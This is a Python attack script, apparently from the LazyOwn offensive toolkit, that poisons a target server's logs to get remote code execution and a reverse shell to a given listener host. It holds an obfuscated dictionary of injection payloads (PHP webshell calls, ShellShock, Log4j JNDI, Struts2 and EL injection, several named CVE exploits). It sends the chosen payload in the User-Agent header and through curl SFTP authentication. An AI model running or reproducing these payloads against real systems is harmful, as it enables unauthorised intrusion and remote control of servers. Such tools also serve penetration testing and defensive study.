#!/usr/bin/env python3
# _*_ coding: utf8 _*_

import requests
import signal
import argparse
import sys
import subprocess
import lazyencoder_decoder as ed

BANNER = """
    __    ___              ____                            
   / /   /   |____  __  __/ __ \_      ______              
  / /   / /| /_  / / / / / / / / | /| / / __ \             
 / /___/ ___ |/ /_/ /_/ / /_/ /| |/ |/ / / / /             
/_________ |_/___/\__, /\____/ |__/|__/_/ /_/          __  
   / ____/_______/_////_ ___  ___ _      ______  _____/ /__
  / /_  / ___/ __ `/ __ `__ \/ _ \ | /| / / __ \/ ___/ //_/
 / __/ / /  / /_/ / / / / / /  __/ |/ |/ / /_/ / /  / ,<   
/_/ __/_/   \__,_/_/ /_/ /_/\___/|__/|__/\____/_/  /_/|_|  
   / /   ____  ____ _                                      
  / /   / __ \/ __ `/                                      
 / /___/ /_/ / /_/ /                                       
/_____/\____/\__, /                                        
    ____    /____/ __             _                        
   / __ \____  (_)/ /____  ____  (_)___  ____ _            
  / /_/ / __ \/ / __/ __ \/ __ \/ / __ \/ __ `/            
 / ____/ /_/ / (_  ) /_/ / / / / / / / / /_/ /             
/_/    \____/_/  _/\____/_/ /_/_/_/ /_/\__, /              
              /_/                     /____/               
[*] Iniciando: LazyOwn Log Poisoning [;,;]
"""
print(BANNER)

shift_value = 3
substitution_key = "clave"


def ensure_http_prefix(url):
    if not url.startswith(("http://", "https://")):
        return "http://" + url
    return url


def signal_handler(sig: int, frame: any) -> None:
    print(f"\n[*] Interrupción recibida, saliendo del programa.")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


def main():
    parser = argparse.ArgumentParser(description="LazyOwnLogPoisoning")
    parser.add_argument("--rhost", required=True, help="Host of the server")
    parser.add_argument("--lhost", required=True, help="host of the reverse shell")

    args = parser.parse_args()

    rhost = args.rhost
    lhost = args.lhost

    url = ensure_http_prefix(rhost)

    cmd = ed.decode(
        "DaIxhHOwyZF-MgHaNJT2Q3UhjH97zNmjf3Y9ZcKeRnP3PIO-HqJ=",
        shift_value,
        substitution_key,
    )
    payloads2 = {
        "PHP system var c": "UR9uhMOja3qngECyYFPmW0YSDdrmH10dRwH_Dj==",
        "PHP exec": "UR9uhMOjXEmzBwnpL0bMATvlFdrgIAxuSx4=",
        "PHP shell_exec": "UR9uhMOja2mzeEekNAfsDmjiE0rITMxbBwkiYWqnUn4=",
        "PHP passtrhu": "UR9uhMOjaNKnf3YtqqSvOT9FYAFeH2RbAQr7WG8-",
        "PHP eval": "UR9uhMOjXEEveAnpL0bMATvlFdrgIAxuSx4=",
        "PHP assert": "UR9uhMOjWESnCVQ0YFPmW0YSDdrmH10dRwH_Dj==",
        "Java": "ZbYskLzwXZ5bCVYXrZ50fK1jRHyxXEmzBwoYsAL0EK0sG2J0XD52NAkopZOuPGn=",
        "ShellShock": "PQneldO6M307LA9noZ4cDaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPQj=",
        "Python": "fK1ui3X0GN9nRwIaqb5gjLQ0GB0rz3RiC2C0NZ52PQghiBEqIZp=",
        "Node.js": "haYvkBzbXZlbB2oupJPmhVMtF2JcafhdOkC4NZKvhaYvkBzbXZlbgVQxXbibhUIwj2IratAlgUsdNVeufVU0jHqsJtSmCUM0NYLshbCjjnvpbD5xgEsaplYvhaYvSHPbXERdLFzlqpTgQbgwhCFoQNAvCAndAGYzNVveQ0ByzuWzelXyJKjdEGf6PHr0XEm0O3IxMZjbOmE9RYgjatAnOkCzNFeuXUYqiL8jT29meEXsYWqnkGnsiLzcbNAiNBTbAGYwQa9sRHrvyES0CU5uppauQQEkkB5mbNqjegHtYVZ7NUQtisByzNZieE9sYFbAELM2GCWjauAiekszNbZoiQEmkMFzMp8jPRP3ZmYbRQ4vVoAzKKFjMwr7WK0wQa9sRHrbXEK1CVU0XbunEbYsF3Fsz24uNFQqqVunhaYxRXP7GOOzfVCuqpSvO3I1GCX5a3WmdU5sXbibhUIwj2IratAlgUsdNVeuiLMqQdyxaNKmf2BtqpTeQbYwiHyxaEAzflruZpLaEQE9RX5mzDVdNRz=",
        "Ruby": "DSYMCqgqW21yM11l",
        "Perl": "h3oxkLJwIJWTWjGopZOw",
        "ASP.NET": "Z3oxkLJwJrWdBUkzp3L0fKQxSqPbz2Szf3TzI3PohbTmYB52yEOjek1qpqObW2Y0YB52yEOjek1qpqPDDLMnFBXvXZlbB21pXbiw",
        "Go": "g3PtGCvoWf5Re21yMZ5rPU9xSprobNAiggnsM21rOmnnSqX1zpld",
        "Rust": "h3UiVodzat9xCVUeCmnKg21rFB5nMquiCVjtNZ52Txs2FCWrH2ShCAjuZqTbi3MfjHusIZ5jgVYbrAOvPG5jlMPoW3VcM2GmoZvsEQE0idPocNAxgVYqWKZfg2Qjj3AqIAx=",
        "Lua": "g3PsGCvoW3A0CQoaqb5uELUjisMrH2ShCAjuYT==",
        "Bash": "DaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPO==",
        "PowerShell": "Z3UfjsEwSOOjB2CeqbYrEK52VrBwXH==",
        "Elixir": "Z3oxkLJwJtShCAnnMpDgfQLqPKglJDRwOAIYsAL0EK0sG2J0V2AiggnnM21rNwobRV==",
        "Kotlin": "ZbYskLzwXZ5bCVYXrZ50fK1jRHyxXEmzBwoYsAL0EK0sG2J0XD52NAkopZOuPGn=",
        "Scala": "h3oxSsPbz2Szf3TzIKHcD2YxjdvWcES0CU0zN2T0EK52RHrmzDVbNQrzWT==",
        "Swift": "gUY0PMFka2xuSQIVqp9qELQxRHy7GOWvf2zzpJD1gaQmBLT0yJF9LAPaMpjbQ2Mfj2ulMfG0BVUwZpDfE3YrGB50afF9LDznZZKpQQEOjr9mXESnVU5rpb5dha9hGCBcQD5aew5qpqXwha9siBJxbMxwB21pWo0oCHvekLTcyf5gBVCzM2evPE==",
        "TypeScript": "haYvkBzbXZlbB2oupJPmhVMtF2JcafhdOkC4NZKvhVMtF2Jcaf5zelFzM21rPE==",
        "ColdFusion": "N0QwGBT0XB9wdkCorFepfaI2FXWvGJOeBVGmZpvogafsBsJxbNqhCQPuZpbsiTM1isFszDZcNQ5qsJTqPVCfjrzkWtczfw5opZOwNk==",
        "Haskell": "Z3oxkLJwJsGme2Uqq3Kbh3oxkLJwGJmbCVYKpqWnNaQrGHWs",
        "R": "h3oxkLJwIMS5fw5sNAPsgbBmQ2BwXJhdNO==",
        "Groovy": "NbQmPHFlWEScLA1uWG4tNQ9iGCMybNSkOxLdBb4dQxDsTX8cKARnQwHbDlWeNu==",
        "Erlang": "g3P6F21nIN9nRkkqrJTbiwjgF21nGppdOe==",
        "Julia": "hbYsRLOnPB5KZwQopZOpCKDn",
        "Clojure": "PUQqi2d1atZidkM2MV5gfUYqiH9cyJFcX3serJTaQ2gjkLJxbpFwB21pWliw",
        "Dart": "ZVMtF2Jcaf5mgU5YsZ5qPTEqFCFpz3OhOkCzrpjfg25rGB50UfixeUXsLVunB10nSsB0XN91gY==",
        "Scala (Play)": "ZbYskLzwXZ5bCVYXrZ50fK1jRHyxXEmzBwoYsAL0EK0sG2J0XD52NAkopZOuPGn=",
        "Nim": "g3Qujr9mJtA4CUUIpZOvE2Y0YB52IJOxeUXnYVi=",
        "Crystal": "ZVMtF2Jcaf5mgU4tMpDgfQDrhXO-HpFjCEC2Z3PqhQ8vToqxKJ4kOhLaAcCgRnfeTI4pKZp=",
        "V": "g3PsGCvoWfmxeUXu",
        "F#": "Z3oxkLJwJrWdBUkzp3L0fKQxSqPbz2Szf3TzI3PohbTmB3zcbNAhOiCzrpjfg25rGB50JrizgCCzrpjfg25rGB50TtKmdUMnpJSvNaQrGHWsIX==",
        "Elixir (Phoenix)": "Z3oxkLJwJtShCAnnMpDgfQLqPKglJDRwOAIYsAL0EK0sG2J0V2AiggnnM21rNwobRV==",
        "Powershell (Windows)": "Z3UfjsEwSOOjB2CeqbYrEK52VrBwXH==",
        "MATLAB": "h3oxkLJwINizgECzrleuD21iQdys",
        "Objective-C": "h3oxkLJwINizgECzrlepD21iPnys",
        "Fortran": "D2IqiHPocNAxgVYqL2LcgK1firFizNqiCQosNAPsgbBmQ2BwXJhdNO==",
        "OCaml": "AK5nlH5ccES0CU0lYIL5hm5lGCFozuDuLkUyNFGw",
        "Scheme": "PVQ5j3FozZFcC2C0NZ52NQMhiBElIZp=",
        "Smalltalk": "Y1QOjr9mXESnLEUapZ1ogaT6PHvWcES0CU0lN2T0WK52VnOqW21yMwr=",
        "COBOL": "D2IqiHOqa3qngECyXbZ1h2osGdPlcZG2BUe1NVZoEUUwGCBcGN9aLEUyND==",
        "Struts2_RCE1": "OLvmP189H211eFYuqJDfiQ9ki3XwJDWvgELsYV4vN1wjiBTszJGkfk90NZL0EKUbRHrmz20ie3IqpqL5gLEmi255Jum3e3QwAl5rfLQuFCFmyNAmOio0rKZAELM2iLJ0StAnfE9zq2SuPG5lGCFAatq0CVPtYVuqg3Y0SsPbyD50NAknMALvNQ1nPI4pGJ9yCVFarJLdQnHwUd4zJqFiPQ8eAWKgSmDuWnMaHfpgL291rF5tgVYxhHusJJSjgVXzM2vch2XmRXz9",
        "Tcl": "ELkjFdOnXD52NEUyNFi=",
        "JSF_ELInjection": "N3wwGCT1XES0OlUqrHD0iVMnFsJ0XZlbCVoqMbazNTTmhrT2WZ5gBU5sZoH1gbUniBIsJtizgDQ1pqPwgKXmRX5ocNAxNAknMALvNQ1nPI4pGJ9yCVFarJLdQnHwUd4zJqFiPQ8eAWKgSmDuWnMaHfpdiO==",
        "JSP_ELInjection": "OVw7irJ3GNuvgkLzpJDbEm5Ojr9mXESnTlCupJPshwjlFrTcyJFhdQH-XlYcEUY2S3FmaJ8lPhjzAF4dQxHtTeScKghuPB4rAVabh3EqhCErHfFbNQrzq3PohbTmRC19",
        "Log4j_JNDI": "OVwoirFsMtcyBVH6Zb8eRxfsTH4zJqJjeUMxr2DfEL0=",
        "GroovyScriptEngine": "OVw7G3Xyz3E5OlC0oZubWLCfiH5wXZlbBkMeoFYafGD-QnOyXNA2O3YoqF8eRxfsTH4zJqJjPxLeAcanRR4kTXqsdE0=",
        "Scripting_Language_Perl": "hUYwiHOwXZFbCVoqMbYpDaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPQPs",
        "Scripting_Language_Python": "hVo0hL9xGJ1xLAkupAZchbTei3A7GN9nOlU5q3PsgGjgFrTcyJFhdQH-XlYcEUY2S3FmaJ8lPhjzAF4dQxHtTeScKghuPB4rAVGwOk==",
        "Scripting_Language_Ruby": "hbYglXOwXZFbCVoqMbYpDaIxhHOwyZF-MgHaNJT2Q3UhjH8aKqhiPA4bZmCcRnHxTeqjKK4aPQPs",
        "CVE-2019-19781": "Q3Cuin8xJp92fE5eZ3ZchbUfiH9cW3OdfFYeZ25si2MrSsPv",
        "CVE-2020-5902": "Q3UrkByyzN9bdU4zoqLdQm4sVd90zEAdO2eaM2DzgULtk29by3SkBUUqZ2XwgUYQGBTnJtunfY==",
        "CVE-2020-3452": "QmwBB0BSTJxjgFQmpqLzDLUni24wbNKweEB=",
        "CVE-2018-13382": "Q3Cuin8xJp9yBU5mZZ5oQm4sS2FkztJjdFYypGToD2PtG3JkW2Khe2eqZ3LqhaoukMAya2Anf2sapnvcE291kF==",
        "CVE-2017-5638": "OVw7RHBizDAhBkCdEZLqELQxWZPyX25gOi9sppvKg250GCv0OLWTUiMAHIPmYIYLXpJVV0KRT0CYIbibPQQhiBE9H2Ovf2nlZZinUwBeS2Fobp90B3HaAWG3QxDsTH4aJgRlPxT3WGY-OxHlRX4rG2qng2szDVfHfaI2FX5vWD5bOjU5q3PsgIElGCFTat9kCVQ0sVeug3PsirTwXZhdOlYaHJ93ELMBFCBoIJpiB29zrJDwgbPmQ3rszphdNQrzYFLqgKUxWXumyES3dU4_sbbqgKTsGCvoHfbbO2TsZFLqgKU9VsgqJ2Odeg9nMALvOmzlSBAqJJSxeUY9YVibPQQuWB5obfGeBVGmZpvogafsBMXyW2Anf0Q1oZvrELLmP2BwXORdNQ4tW3YbhaYihCXoW3WTflQaqoL0haYfiXv0auAzNQrzYFLdha9hGCBcNZSkOlU0MAH0PQnnSnvDz3ObOkMbMZLvEG5hi21wz25nOksaZnjWALUniMBDbN9HgFQuppavN3Ewi2Boa3RiC2C0GZ5diLURkMXoWD0cNQrutA0=",
        "CVE-2021-22986": "Q21liCEybN0jgVYupF9pDLQmPH1sGK4aLA9pNAWciUQuSeSbLf4kOhHzAV8gRHPxUdOzNpDl",
    }

    # Desofuscar el diccionario de cadenas
    decoded_dict = {
        key: ed.decode(value, shift_value, substitution_key)
        for key, value in payloads2.items()
    }

    print("[*] Opciones de Payloads disponibles:")
    for idx, lang in enumerate(decoded_dict.keys(), start=1):
        print("{}. {} : {}".format(idx, lang, list(decoded_dict.items())[idx-1]))

    # Preguntar al usuario cuál desea ejecutar
    choice = int(input("\nElige un payload para ejecutar (número): ")) - 1
    selected_payload = list(decoded_dict.items())[choice]
    cmd = cmd.replace("{lhost}",lhost)
    command = input(f"    [!] Some payload needs a command (default: {cmd}): ") or cmd

    # Formatear y enviar la solicitud
    headers = {
        "User-Agent": selected_payload[1].replace("cmd",command)
    }
    
    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
    
    print(f"\n[*] Ejecutando payload: {selected_payload[0]}")
    print(f"[*] Código de respuesta: {response.status_code}")
    print(f"[*] Respuesta del servidor: {response.text}")

    # SSH Log Poisoning mediante ssh y curl
    # Define el comando curl con la autenticación y la URL
    url = url.replace("http://", "")
    url = url.replace("https://", "")
    command = [
        "curl",
        "-u",
        selected_payload[1].replace("cmd", cmd),  # Autenticación
        "sftp://" + url + "/anything",  # URL del recurso
        "-k",
    ]
    # Ejecuta el comando y captura la salida
    result = subprocess.run(command, capture_output=True, text=True)

    # Imprime la salida
    print(result.stdout)


if __name__ == "__main__":
    main()
